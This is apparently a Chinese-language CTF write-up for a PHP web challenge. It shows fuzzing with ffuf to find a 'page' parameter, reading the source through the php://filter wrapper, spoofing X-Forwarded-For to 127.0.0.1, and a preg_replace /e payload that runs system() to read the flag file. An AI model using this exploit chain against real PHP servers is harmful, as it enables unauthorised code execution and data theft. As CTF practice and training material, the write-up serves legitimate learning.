看一下有什么

![image](https://github.com/user-attachments/assets/fa7ab568-bd2c-485f-aee9-8aede930147f)

只有/index.php

![image](https://github.com/user-attachments/assets/5b618ff1-ff47-40d6-a52b-75df4217b995)

模糊测试得到一个page

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://223.112.5.141:52073/index.php?FUZZ=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 403 -c -fs 2305 -s
page
```

尝试用php伪协议读取源码?page=php://filter/read=convert.base64-encode/resource=index.php

```
<?php
$page = $_GET[page];
if (isset($page)) {
if (ctype_alnum($page)) {
?>
<?php
}else{
?>
<?php
}}
//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
if ($_SERVER['HTTP_X_FORWARDED_FOR'] == '127.0.0.1') {
    echo "<br >Welcome My Admin ! <br >";
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];
    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }
}
?>
```

改一下HTTP_X_FORWARDED_FOR为127.0.0.1

preg_replace 函数：preg_replace ($pattern, $replacement, $subject) 函数会将 subject 中匹配 pattern 的部分用 replacement 替换，启用 /e 参数，就会将 replacement 当做 php 代码执行

![image](https://github.com/user-attachments/assets/5de612b6-253f-438b-86f6-3630add4e430)

flag：?pat=/abc/e&rep=system('cat+s3chahahaDir/flag/flag.php')&sub=abc

![image](https://github.com/user-attachments/assets/b8942d75-9859-442d-a32d-3637777e7474)
